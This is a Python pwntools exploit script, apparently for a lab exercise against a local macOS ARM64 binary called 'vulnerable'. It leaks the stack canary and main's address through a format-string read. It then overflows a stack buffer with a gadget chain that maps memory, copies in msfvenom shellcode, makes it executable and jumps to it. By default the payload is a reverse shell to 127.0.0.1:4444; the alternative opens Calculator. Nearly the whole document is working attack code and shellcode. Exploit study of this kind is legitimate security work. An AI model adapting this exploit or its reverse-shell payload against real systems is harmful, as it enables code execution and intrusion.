from pwn import *

context.log_level = 'debug'
context.arch = 'aarch64'

payload_type = "reverse_shell" # calculator | reverse_shell

if payload_type == "calculator":
    # msfvenom -p osx/aarch64/exec CMD="/usr/bin/open -a Calculator" -f python
    buf = b""
    buf += b"\xf0\x03\x1f\xaa\x10\x40\xa0\xf2\x70\x07\x80\xf2"
    buf += b"\xe9\x03\x00\x91\xe0\xa5\x8e\xd2\x60\x4e\xae\xf2"
    buf += b"\xe0\x45\xcc\xf2\x20\xcd\xed\xf2\x20\x85\x00\xf8"
    buf += b"\xe0\xe5\x8d\xd2\x00\xae\xac\xf2\xc0\x0d\xc0\xf2"
    buf += b"\x20\x85\x00\xf8\xe0\x03\x09\xaa\x00\x40\x00\xd1"
    buf += b"\xa1\x25\x8c\xd2\x01\x00\xa0\xf2\x21\x85\x00\xf8"
    buf += b"\xe1\x03\x09\xaa\x21\x20\x00\xd1\x61\x28\x8c\xd2"
    buf += b"\x81\x6d\xac\xf2\xa1\x8e\xcd\xf2\x21\x8c\xee\xf2"
    buf += b"\x21\x85\x00\xf8\xe1\x4d\x8e\xd2\x01\x00\xa0\xf2"
    buf += b"\x21\x85\x00\xf8\xe1\x03\x09\xaa\x21\x40\x00\xd1"
    buf += b"\xe1\x03\x09\xaa\x21\xa0\x00\xd1\x21\x85\x00\xf8"
    buf += b"\xe1\x03\x09\xaa\x21\x80\x00\xd1\x21\x85\x00\xf8"
    buf += b"\xe1\x03\x09\xaa\x21\x80\x00\xd1\x21\x85\x00\xf8"
    buf += b"\x3f\x85\x00\xf8\xe1\x03\x09\xaa\x21\x80\x00\xd1"
    buf += b"\xe2\x03\x1f\xaa\x01\x00\x00\xd4"
elif payload_type == "reverse_shell":
    # msfvenom -p osx/aarch64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f python
    buf =  b""
    buf += b"\x40\x00\x80\xd2\x21\x00\x80\xd2\x02\x00\x80\xd2"
    buf += b"\x10\x40\xa0\xd2\x30\x0c\x80\xf2\x01\x00\x00\xd4"
    buf += b"\xed\x03\x00\xaa\x21\xf8\x7f\xd3\x21\x82\xab\xf2"
    buf += b"\xe1\x0f\xc0\xf2\x01\x20\xe0\xf2\xe1\x8f\x1f\xf8"
    buf += b"\xe1\x03\x00\x91\x21\x00\x02\x8b\x02\x02\x80\xd2"
    buf += b"\x10\x40\xa0\xd2\x50\x0c\x80\xf2\x01\x00\x00\xd4"
    buf += b"\x10\x40\xa0\xd2\x50\x0b\x80\xf2\xe0\x03\x0d\xaa"
    buf += b"\x01\x00\x80\xd2\x01\x00\x00\xd4\xe0\x03\x0d\xaa"
    buf += b"\x21\x00\x80\xd2\x01\x00\x00\xd4\xe0\x03\x0d\xaa"
    buf += b"\x41\x00\x80\xd2\x01\x00\x00\xd4\x10\x40\xa0\xd2"
    buf += b"\x70\x07\x80\xf2\xe9\x03\x00\x91\xe0\x45\x8c\xd2"
    buf += b"\x20\xcd\xad\xf2\xe0\x65\xce\xf2\x00\x0d\xe0\xf2"
    buf += b"\x20\x85\x00\xf8\xe0\x03\x09\xaa\x00\x20\x00\xd1"
    buf += b"\xe1\x03\x09\xaa\x21\x20\x00\xd1\x21\x85\x00\xf8"
    buf += b"\x3f\x85\x00\xf8\xe1\x03\x09\xaa\x21\x40\x00\xd1"
    buf += b"\xe2\x03\x1f\xaa\x01\x00\x00\xd4"
else:
    print("[!] Invalid payload type. Use 'calculator' or 'reverse_shell'.")
    sys.exit(1)

p = process("./vulnerable")

# NOTE:
# The following offsets and indices are specific to the current binary layout.
# They may change if the binary is recompiled, the source code is modified, or
# the macOS version/toolchain updates.
# - The number of %p specifiers (84) is tuned to leak the correct values.
# - arr[69] assumes the stack canary is at index 69.
# - arr[81] assumes the return address of main() is at index 81.
# - main_offset and func_offset are based on disassembly and may vary.
# Always verify offsets and indices using tools like LLDB, objdump, or Ghidra.

payload = b'%p ' * 84
p.sendline(payload)
s = p.recvline()

arr = s.strip().split()
canary = int(arr[69], 16)
main_addr = int(arr[81], 16)
main_offset = 0x4cc
func_offset = main_offset - 0xbc
imagebase = main_addr - main_offset
func_addr = imagebase + func_offset

print('canary:', hex(canary))
print('main_addr:', hex(main_addr))
print('imagebase:', hex(imagebase))
print('func_addr:', hex(func_addr))

payload = buf + b'A' * (512 - len(buf))
payload += p64(canary)
payload += p64(0) * 3
payload += p64(func_addr + 0x0) # sub x25, sp, #0x228
payload += p64(func_addr + 0xc) # mov x0, xzr
payload += p64(0)
payload += p64(func_addr + 0x18) # mov x1, #0x400
payload += p64(0)
payload += p64(func_addr + 0x24) # mov x2, #0x3
payload += p64(0)
payload += p64(func_addr + 0x30) # mov x3, #0x1002
payload += p64(0)
payload += p64(func_addr + 0x3c) # mov x4, #-0x1
payload += p64(0)
payload += p64(func_addr + 0x48) # mov x5, xzr
payload += p64(0)
payload += p64(func_addr + 0x54) # bl _mmap
payload += p64(0)
payload += p64(func_addr + 0x60) # mov x19, x0
payload += p64(0)
payload += p64(func_addr + 0x6c) # mov x1, x25
payload += p64(0)
payload += p64(func_addr + 0x78) # mov x2, #0x400
payload += p64(0)
payload += p64(func_addr + 0x84) # bl _memcpy
payload += p64(0)
payload += p64(func_addr + 0x90) # mov x0, x19
payload += p64(0)
payload += p64(func_addr + 0x18) # mov x1, #0x400
payload += p64(0)
payload += p64(func_addr + 0x9c) # mov x2, #0x5
payload += p64(0)
payload += p64(func_addr + 0xa8) # bl _mprotect
payload += p64(0)
payload += p64(func_addr + 0x90) # mov x0, x19
payload += p64(0)
payload += p64(func_addr + 0xb4) # br x0

p.send(payload)

input("Payload sent. Press Enter to exit...")